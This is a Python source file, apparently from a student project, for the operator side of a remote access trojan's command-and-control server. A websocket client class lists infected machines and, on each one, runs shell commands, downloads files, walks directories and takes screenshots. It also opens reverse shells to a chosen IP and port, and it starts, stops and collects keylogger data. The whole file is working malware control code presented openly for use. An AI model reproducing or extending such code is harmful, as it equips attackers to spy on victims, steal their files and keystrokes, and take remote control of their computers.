import websocket
import json


class C2_API:
  def __init__(self, url):

    self.ws = websocket.create_connection(url)
    self.ws.settimeout(30)

  def Forward(self, message):

    self.ws.send(str(message))

  def Read(self):
    res = json.loads(self.ws.recv())
    if res == "Failure":
      return None
    return res

  def GetAllRatsIds(self):
    message = {
      "version": 1,
      "rat_id": 0,
      "message": {
        "Backend": "GetAllRats"
      }
    }

    self.Forward(json.dumps(message))
    return self.Read()["Success"]

  def GetRatsInfo(self, rat_id: list[int]):
    message = {
      "version": 1,
      "rat_id": 0,
      "message": {
        "Backend": {
          "GetMetadata": rat_id
        }
      }
    }

    self.Forward(json.dumps(message))
    response = self.Read()
    if response is None:
      return "Failure"


    response["Success"]["RatsMetaData"] = [
      {**rat, "avatar": f"https://api.dicebear.com/9.x/bottts/svg?seed={rat["ratId"]}&baseColor=00897b,00acc1,039be5,1e88e5,3949ab,546e7a,5e35b1,757575,8e24aa&eyes=bulging,dizzy,eva,frame1,frame2,glow,happy,robocop,round,roundFrame01,roundFrame02,sensor,shade01&textureProbability=60&backgroundColor=transparent"} for rat in response["Success"]["RatsMetaData"]
    ]

    return response

  def execute_command(self, rat_id: int, command: str):
    message = {
      "version": 1,
      "rat_id": int(rat_id),
      "message": {
        "Backend": {
          "CliCommand": {
              "command": command,
              "priority": 10
            }
        }
      }
    }

    self.Forward(json.dumps(message))
    response = self.Read()
    if response is None:
      return "Failure"
    print(response)
    return response["Success"]["CliResponse"]


  def request_file(self, rat_id, file_path):
    message = {
      "version": 1,
      "rat_id": int(rat_id),
      "message": {
        "Backend": {
          "RequestFileDownload": {
            "file_path": file_path
          }
        }
      }
    }

    self.Forward(json.dumps(message))

    return json.loads(self.ws.recv())


  # TODO: Implement the following methods

  def get_file_download_status(self, rat_id, file_id):
    message = {
      "version": 1,
      "rat_id": int(rat_id),
      "message": {
        "Backend": {
          "GetDownloadStatus": int(file_id)
        }
      }
    }

    self.Forward(json.dumps(message))
    response = self.Read()
    if response is None:
      return "Failure"
    res = response["Success"]["DownloadStatus"]
    res = {key: str(value) for key, value in res["Complete"].items()}

    res["filename"] = res["file_path"].split('/')[-1]

    return res

  def get_all_downloaded_files(self, rat_id):
    message = {
      "version": 1,
      "rat_id": int(rat_id),
      "message": {
        "Backend": "GetDownloadedFiles"
      }
    }

    self.Forward(json.dumps(message))
    response = self.Read()
    if response is None:
      return "Failure"
    res = response["Success"]["DownloadedFiles"]
    ress = []
    for file in res:
      file["filename"] = file["file_path"].split('/')[-1]
      file = {key: str(value) for key, value in file.items()}
      ress.append(file)

    return ress



  def download_file(self, rat_id, file_id):
    data = self.get_file_download_status(rat_id, file_id)
    print(data)
    file_path = f"/home/hqnw/Desktop/project_3.1/code/rat_c2_server/downloads/{rat_id}/{data["download_id"]}|{data["file_path"].split('/')[-1]}"
    
    with open(file_path, "rb") as file:
      file_content = file.read()
      extention = file_path.split('.')[-1]

    return file_content, data["file_path"].split('/')[-1], extention

  # TODO:

  def list_file_tree(self, rat_id, file_path, depth):
    message = {
      "version": 1,
      "rat_id": int(rat_id),
      "message": {
        "Backend": {
          "ListDir": {
            "path": file_path,
            "depth": depth
          }
        }
      }
    }

    self.Forward(json.dumps(message))
    response = self.Read()
    if response is None:
      return "Failure"
    print(response)
    res = response["Success"]["DirList"]
    return res

  def take_screenshot(self, rat_id):
    message = {
      "version": 1,
      "rat_id": int(rat_id),
      "message": {
        "Backend": "Screenshot"
      }
    }

    self.Forward(json.dumps(message))
    response = self.Read()
    if response is None:
      return "Failure"
    res = response["Success"]["Screenshot"]
    return res


  def open_reverse_shell(self, rat_id, ip, port):
    message = {
      "version": 1,
      "rat_id": int(rat_id),
      "message": {
        "Backend": {
          "ReverseShell": {
            "ip": ip,
            "port": port
          }
        }
      }
    }

    self.Forward(json.dumps(message))
    response = self.Read()
    if response is None:
      return "Failure"
    return response


  def start_keylogger(self, rat_id):
    message = {
      "version": 1,
      "rat_id": int(rat_id),
      "message": {
        "Backend": "StartKeylogger"
      }
    }

    self.Forward(json.dumps(message))
    response = self.Read()
    if response is None:
      return "Failure"
    return response

  def stop_keylogger(self, rat_id):
    message = {
      "version": 1,
      "rat_id": int(rat_id),
      "message": {
        "Backend": "StopKeylogger"
      }
    }

    self.Forward(json.dumps(message))
    response = self.Read()
    if response is None:
      return "Failure"
    return response

  def get_keylogger_data(self, rat_id):
    message = {
      "version": 1,
      "rat_id": int(rat_id),
      "message": {
        "Backend": "GetKeyloggerData"
      }
    }

    self.Forward(json.dumps(message))
    response = self.Read()
    if response is None:
      return "Failure"
    return response

  def get_keylogger_status(self, rat_id):
    message = {
      "version": 1,
      "rat_id": int(rat_id),
      "message": {
        "Backend": "GetKeyloggerStatus"
      }
    }

    self.Forward(json.dumps(message))
    response = self.Read()
    if response is None:
      return "Failure"
    return response